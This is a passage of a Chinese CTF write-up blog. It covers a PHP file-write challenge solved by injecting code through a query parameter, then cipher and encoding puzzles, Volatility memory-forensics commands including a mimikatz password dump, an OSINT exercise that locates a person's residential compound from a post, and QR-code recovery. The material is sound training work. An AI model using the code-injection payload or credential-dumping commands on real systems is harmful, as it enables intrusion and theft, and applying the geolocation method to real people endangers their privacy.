class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">case</span> <span class="token single-quoted-string string">'pwd'</span><span class="token punctuation">:</span>        <span class="token keyword">echo</span> <span class="token variable">$dir</span><span class="token punctuation">;</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">case</span> <span class="token single-quoted-string string">'upload'</span><span class="token punctuation">:</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token double-quoted-string string">"data"</span><span class="token punctuation">]</span> <span class="token operator">?</span><span class="token operator">?</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>        <span class="token function">waf</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"<span class="token interpolation"><span class="token variable">$dir</span></span>"</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">"index.php"</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里重要的就是<code>file_put_contents(&quot;$dir&quot; . &quot;index.php&quot;, $data);</code>这个点了啊，将传入的数据<code>data</code>写入<code>index.php</code>这个文件，然后上面又给了这个文件所在的目录，所以这里可以直接先<code>pwd</code>获得这个目录，打开一个标签页，然后再使用</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?echo(&#96;ls\t&#x2F;&#96;)?&gt;bin boot dev etc flllllll1112222222lag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>获得flag的文件名再cat一下就行了。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?action&#x3D;upload&amp;data&#x3D;&lt;?echo(&#96;cat\t&#x2F;flllllll1112222222lag&#96;)?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="编码与密码"><a href="#编码与密码" class="headerlink" title="编码与密码"></a>编码与密码</h2><h3 id="base64换表脚本"><a href="#base64换表脚本" class="headerlink" title="base64换表脚本"></a>base64换表脚本</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">import</span> stringstr1 <span class="token operator">=</span> <span class="token string">"x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q"</span>string1 <span class="token operator">=</span> <span class="token string">"ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/"</span>string2 <span class="token operator">=</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span><span class="token keyword">print</span> <span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>str1<span class="token punctuation">.</span>translate<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">.</span>maketrans<span class="token punctuation">(</span>string1<span class="token punctuation">,</span>string2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>str1是要解密的代码、string1是改过之后的base64表</p></blockquote><h3 id="一些特殊编码的题目"><a href="#一些特殊编码的题目" class="headerlink" title="一些特殊编码的题目"></a>一些特殊编码的题目</h3><h4 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h4><p>给出的附件内容如下：</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">(╯°□°）╯︵ ┻━┻50pt(╯°□°）╯︵ ┻━┻d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到给出的有效的条件的内容仅为一堆十六进制的字符串，这个时候考虑下面的编码方式。</p><p>两位十六进制转十进制<code>-128</code>再转ASCII。脚本如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">s <span class="token operator">=</span> <span class="token string">'d4e8e1f4a0f7e1f3a0e6e1f3f4a1a0d4e8e5a0e6ece1e7a0e9f3baa0c4c4c3d4c6fbb9b2b2e1e2b9b9b7b4e1b4b7e3e4b3b2b2e3e6b4b3e2b5b0b6b1b0e6e1e5e1b5fd '</span>t <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    t<span class="token punctuation">.</span>append<span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">:</span> i <span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> t<span class="token punctuation">:</span>    temp <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token string">'0x '</span> <span class="token operator">+</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">128</span>    flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token comment"># That was fast! The flag is: DDCTF&#123;922ab9974a47cd322cf43b50610faea5&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RCTF2019-draw"><a href="#RCTF2019-draw" class="headerlink" title="[RCTF2019]draw"></a>[RCTF2019]draw</h4><p><strong>logo编码、特殊编码、画图</strong></p><p>给出题目</p><pre class="line-numbers language-none"><code class="language-none">cs pu lt 90 fd 500 rt 90 pd fd 100 rt 90 repeat 18[fd 5 rt 10] lt 135 fd 50 lt 135 pu bk 100 pd setcolor pick [ red orange yellow green blue violet ] repeat 18[fd 5 rt 10] rt 90 fd 60 rt 90 bk 30 rt 90 fd 60 pu lt 90 fd 100 pd rt 90 fd 50 bk 50 setcolor pick [ red orange yellow green blue violet ] lt 90 fd 50 rt 90 fd 50 pu fd 50 pd fd 25 bk 50 fd 25 rt 90 fd 50 pu setcolor pick [ red orange yellow green blue violet ] fd 100 rt 90 fd 30 rt 45 pd fd 50 bk 50 rt 90 fd 50 bk 100 fd 50 rt 45 pu fd 50 lt 90 pd fd 50 bk 50 rt 90 setcolor pick [ red orange yellow green blue violet ] fd 50 pu lt 90 fd 100 pd fd 50 rt 90 fd 25 bk 25 lt 90 bk 25 rt 90 fd 25 setcolor pick [ red orange yellow green blue violet ] pu fd 25 lt 90 bk 30 pd rt 90 fd 25 pu fd 25 lt 90 pd fd 50 bk 25 rt 90 fd 25 lt 90 fd 25 bk 50 pu bk 100 lt 90 setcolor pick [ red orange yellow green blue violet ] fd 100 pd rt 90 arc 360 20 pu rt 90 fd 50 pd arc 360 15 pu fd 15 setcolor pick [ red orange yellow green blue violet ] lt 90 pd bk 50 lt 90 fd 25 pu home bk 100 lt 90 fd 100 pd arc 360 20 pu home<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>复制前面的一部分谷歌一下发现<a href="https://personal.utdallas.edu/~veerasam/logo/">解释</a></p><p>还有在线的代码运行的<a href="https://www.calormen.com/jslogo/">网站</a></p><p>直接粘贴进去运行一下即可。</p><p><img src="/2021/05/28/CTF/image-20210827223320692.png" alt></p><h3 id="手机按键音"><a href="#手机按键音" class="headerlink" title="手机按键音"></a>手机按键音</h3><h4 id="WUSTCTF2020-girlfriend"><a href="#WUSTCTF2020-girlfriend" class="headerlink" title="[WUSTCTF2020]girlfriend"></a>[WUSTCTF2020]girlfriend</h4><p><a href="http://dialabc.com/sound/detect/index.html">在线网站</a></p><p>DTMF拨号音识别</p><pre class="line-numbers language-none"><code class="language-none">999 * 666 * 88 * 2 * 777 * 33 * 6 * 99 * 4 * 444 * 777 * 555 * 333 * 777<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>按九宫格解一下码为</p><pre class="line-numbers language-none"><code class="language-none">you are my girlfriend<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在线网站识别的总是少一段，虽然最后我们推测也是可以推测出来的，但是还是有拨号音识别的相关的专用的工具以供下载的</p><p><a href="http://aluigi.altervista.org/mytoolz/dtmf2num.zip">拨号音识别工具</a></p><p><a href="http://freshmeat.sourceforge.net/projects/dtmf2num">dtmf2num官方网址</a></p><p><img src="/2021/05/28/CTF/image-20210701205601479.png" alt="image-20210701205601479"></p><pre class="line-numbers language-none"><code class="language-none">999*666*88*2*777*33*6*999*4*4444*777*555*333*777*444*33*66*3*7777youaremygirlfriends<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><code>flag&#123;youaremygirlfriends&#125;</code></p><h3 id="W型栅栏密码"><a href="#W型栅栏密码" class="headerlink" title="W型栅栏密码"></a>W型栅栏密码</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token triple-quoted-string string">'''若知道栏数，则使用decode解密，若不知道，则使用crack_cipher遍历所有可能性'''</span><span class="token keyword">def</span> <span class="token function">generate_w</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''将字符排列成w型'''</span>    array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'.'</span><span class="token punctuation">]</span><span class="token operator">*</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token comment">#生成初始矩阵</span>    row <span class="token operator">=</span> <span class="token number">0</span>    upflag <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#在矩阵上按w型画出string</span>        array<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">=</span> string<span class="token punctuation">[</span>col<span class="token punctuation">]</span>        <span class="token keyword">if</span> row <span class="token operator">==</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>            upflag <span class="token operator">=</span> <span class="token boolean">True</span>        <span class="token keyword">if</span> row <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            upflag <span class="token operator">=</span> <span class="token boolean">False</span>        <span class="token keyword">if</span> upflag<span class="token punctuation">:</span>            row <span class="token operator">-=</span> <span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            row <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">return</span> array<span class="token keyword">def</span> <span class="token function">encode</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''加密'''</span>    array <span class="token operator">=</span> generate_w<span class="token punctuation">(</span>string<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    msg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#将每行的字符连起来</span>        <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> array<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">:</span>                msg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>array<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> array<span class="token punctuation">,</span> msg<span class="token keyword">def</span> <span class="token function">decode</span><span class="token punctuation">(</span>string<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''解密'''</span>    array <span class="token operator">=</span> generate_w<span class="token punctuation">(</span>string<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    sub <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#将w型字符按行的顺序依次替换为string</span>        <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> array<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">:</span>                array<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">=</span> string<span class="token punctuation">[</span>sub<span class="token punctuation">]</span>                sub <span class="token operator">+=</span> <span class="token number">1</span>    msg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> col <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#以列的顺序依次连接各字符</span>        <span class="token keyword">for</span> row <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> array<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'.'</span><span class="token punctuation">:</span>                msg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>array<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> array<span class="token punctuation">,</span> msg<span class="token keyword">def</span> <span class="token function">crack_cipher</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">'''破解密码'''</span>    <span class="token keyword">for</span> n <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#遍历所有可能的栏数</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'栏：'</span><span class="token operator">+</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>decode<span class="token punctuation">(</span>string<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    string <span class="token operator">=</span><span class="token string">'=h3kllh0YNYIYJMFMBZxXmjzTTjzGmT3mNINEOgYgZVZsZx3z5j1'</span>    n <span class="token operator">=</span> <span class="token number">5</span> <span class="token comment">#栏数</span>    <span class="token comment">#若不知道栏数，则遍历所有可能</span>    <span class="token comment"># crack_cipher(string)</span>    <span class="token comment">#若知道栏数</span>    array<span class="token punctuation">,</span>msg <span class="token operator">=</span> decode<span class="token punctuation">(</span>string<span class="token punctuation">,</span> n<span class="token punctuation">)</span>    <span class="token comment"># array,msg = encode(string, n)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> array<span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>    flag <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="栅栏密码"><a href="#栅栏密码" class="headerlink" title="栅栏密码"></a>栅栏密码</h3><h4 id="XMAN2018排位赛-通行证"><a href="#XMAN2018排位赛-通行证" class="headerlink" title="[XMAN2018排位赛]通行证"></a>[XMAN2018排位赛]通行证</h4><p>这道题目中的栅栏密码应该说是有点特殊的，要在<a href="http://ctf.ssleye.com/railfence.html">在线詹栅栏密码</a>这个网站上进行key为7的加密才能得到正确的内容<code>kzna&#123;blnl_abj_lbh_trg_vg&#125;</code>，然后在进行凯撒密码</p><p><img src="/2021/05/28/CTF/image-20210804191048553.png" alt></p><pre class="line-numbers language-flag" data-language="flag"><code class="language-flag">xman&#123;oyay_now_you_get_it&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="内存取证"><a href="#内存取证" class="headerlink" title="内存取证"></a>内存取证</h2><h3 id="工具安装与使用"><a href="#工具安装与使用" class="headerlink" title="工具安装与使用"></a>工具安装与使用</h3><h4 id="volatility安装使用"><a href="#volatility安装使用" class="headerlink" title="volatility安装使用"></a>volatility安装使用</h4><h5 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h5><p><a href="https://github.com/volatilityfoundation/volatility">GitHub该项目地址</a>，点击右边的Release带版本的最新的版本，也是18年的。。。</p><p><img src="/2021/05/28/CTF/image-20210809165342125.png" alt></p><p>这个volatility对应的是python2，而且如果是在ubuntu中环境也不好配置。</p><p><a href="https://www.volatilityfoundation.org/26">官网地址</a>，也是最新的2.6的版本，然后直接下载下面图片中的这个文件即可，将文件解压后拉到kali中之后直接就能用了。</p><p><img src="/2021/05/28/CTF/image-20210809170151856.png" alt></p><p>然后为了在其他文件夹时也可以使用这个内存分析工具，这里需要将这个目录添加到系统环境变量之中。</p><pre class="line-numbers language-none"><code class="language-none"># 通过修改profile文件:vim &#x2F;etc&#x2F;profile# 修改为类似下面的这样export PATH&#x3D;&#x2F;home&#x2F;m4xlmum&#x2F;misc&#x2F;volatility:$PATH<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>重启一下后，配置即可生效。</p><h5 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h5><p><a href="https://blog.csdn.net/qq_43431158/article/details/109462833">参考链接</a></p><pre class="line-numbers language-none"><code class="language-none"># 查看是什么系统的文件【imageinfo和kdbgscan这两个一般第一个最准确】volatility -f filename imageinfovolatility -f filename kdbgscan# 查看进程信息volatility -f filename pslist --profile&#x3D;WinXPSP2x86# 命令行扫描 ——cmdscanvolatility -f filename cmdscan --profile&#x3D;WinXPSP2x86# 文件扫描 ——filescanvolatility -f filename filescan --profile&#x3D;WinXPSP2x86# 查看notepad中的内容volatility -f filename notepad --profile&#x3D;WinXPSP2x86# 提取文件volatility -f 1.raw  --profile&#x3D;Win7SP1x86 dumpfiles -Q 0x000000003e71e608 --dump-dir&#x3D;.&#x2F;-Q的参数为 内存地址--dump-dir的参数为导出文件的目录# ie浏览器记录iehistory# 截屏screenshot# 内存网络扫描volatility -f filename --profile&#x3D;Win7SP1x64 netscan# 读取cmd命令volatility -f filename --profile&#x3D;Win7SP1x64 amdscan# 列举内存注册表volatility -f filename --profile&#x3D;Win7SP1x64 hivelist# 解析指定的注册表volatility -f filename --profile&#x3D;Win7SP1x64 -o 0xfffff8a0013fb010 printkey# 获取主机名volatility -f filename --profile&#x3D;Win7SP1x64 -o 0xfffff8a0013fb010 printkey -K “ControlSet001\Control\ComputerName\ComputerName”# 获取windows主机用户名volatility -f filename --profile&#x3D;Win7SP1x64 -o 0xfffff8a0013fb010 printkey -K “SAM\Domains\Account\Users\Names”# 抓取用户密码volatility -f filename mimikatz# 文件扫描volatility -f filename filescan# 配合grep文件扫描volatility -f filename filescan | grep “flag”<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="社会工程学"><a href="#社会工程学" class="headerlink" title="社会工程学"></a>社会工程学</h2><h3 id="地图分析——BugKu社工-进阶收集"><a href="#地图分析——BugKu社工-进阶收集" class="headerlink" title="地图分析——BugKu社工-进阶收集"></a>地图分析——BugKu社工-进阶收集</h3><p>提　　示: flag{小美小区名字拼音}</p><p>描　　述: 小明当年为了追求小美想尽办法获得小美的地址。直到有一天小美发了一条说说，小明觉得希望来了。 (实战改编题，难度降低了。)</p><p>给出的附件内容如下所示</p><p><img src="/2021/05/28/CTF/qq.png" alt="附件"></p><p>首先看到那个塔是大雁塔，根据发帖的内容确定</p><ol><li>从发帖人家(附近的<strong>始发站</strong>)出发到大雁塔要做7站地铁。</li><li>该始发站距发帖人家的小区有800米</li><li>下一站距发帖人家1000多米。</li></ol><p>找到大雁塔附近的地铁路线图如下：</p><p><img src="/2021/05/28/CTF/20210219162217227.png" alt="西安地铁路线图"></p><p><img src="/2021/05/28/CTF/image-20210528200737880.png" alt="确定始发站为韦曲南站"></p><p>根据地铁线路图可以发现只有韦曲南站距离大雁塔的站点数为7并且中间又转乘(在小寨)了一站，故现在的条件为，发帖人家的小区距离韦曲南站有800米、距航天城1000多米。打开百度地图</p><p><img src="/2021/05/28/CTF/image-20210528201622601.png" alt="image-20210528201622601"></p><p>到目前为止，差不多一眼就能看出来了，很明显发帖人所在的小区就是兰乔国际城</p><p><img src="/2021/05/28/CTF/image-20210528201736743.png" alt="对距离的大概估算"></p><p><code>flag&#123;lanqiaoguojicheng&#125;</code></p><h2 id="二维码与拼图"><a href="#二维码与拼图" class="headerlink" title="二维码与拼图"></a>二维码与拼图</h2><h3 id="根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事"><a href="#根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事" class="headerlink" title="根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事"></a>根据1、0生成二维码、二维码定位角补充——BugKu1和0的故事</h3><p>附件内容为</p><pre class="line-numbers language-data" data-language="data"><code class="language-dataspan aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>猜测可能是个二维码的形状，打开python写一手转换代码。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"1和0的故事.txt"</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>content<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\n'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\\r'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'b'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'1'</span><span class="token punctuation">:</span>            plt<span class="token punctuation">.</span>scatter<span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token number">250</span><span class="token punctuation">,</span> c<span class="token operator">=</span><span class="token string">'black'</span><span class="token punctuation">,</span> marker<span class="token operator">=</span><span class="token string">','</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># 这个我后来又改了一下，这个我感觉是复原二维码来说最好用的</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/28/CTF/image-20210529000305513.png" alt="得到下面的图像"></p><p>然后用ps添加一下二维码的三个角获得完整的二维码。</p><p>定位角如下</p><p><img src="/2021/05/28/CTF/image-20210528235634252.png" alt="定位角"></p><p>把定位角粘到二维码的三个角的地方就行了，或者使用windows 的画图程序也挺好使的其实，但是如果是拼图的话，画图可能就不是那么好使了。</p><p><img src="/2021/05/28/CTF/image-202105290003055132.png" alt="image-202105290003055132"></p><p>用手机qq勉强也是能扫出来flag的，就是我画的不太好看，用在线的网站都不行。。。<code>flag&#123;QR_c0de_1s_1nterest1n9&#125;</code></p><h2 id="特殊文件"><a href="#特殊文件" class="headerlink" title="特殊文件"></a>特殊文件</h2><h3 id="BugKu、easy-nbt"><a href="#BugKu、easy-nbt" class="headerlink" title="BugKu、easy_nbt"></a>BugKu、easy_nbt</h3><p>这个直接下载个文件的专用打开器，然后把New World文件夹拉入文件打开器search-&gt;value=flag。就找到flag了。</p><p><img src="/2021/05/28/CTF/image-20210530135639553.png" 